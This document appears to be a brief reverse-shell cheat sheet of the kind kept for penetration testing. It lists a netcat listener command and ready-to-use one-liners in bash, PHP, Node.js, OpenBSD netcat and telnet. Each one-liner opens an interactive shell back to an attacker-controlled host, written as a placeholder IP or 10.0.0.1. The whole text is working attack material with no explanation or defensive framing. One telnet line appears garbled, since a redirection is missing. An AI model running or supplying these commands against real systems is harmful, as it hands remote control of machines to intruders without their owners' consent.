## Reverse Shell ##

Start Listener

`nc -nvlp 4444`

Upload bash 

`bash -i >& /dev/tcp/YOURIP/80 0>&1`

PHP

`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>`

Node.js 

`require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');`

OpenBSD

`mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
`

Telnet

`rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p`

`telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443`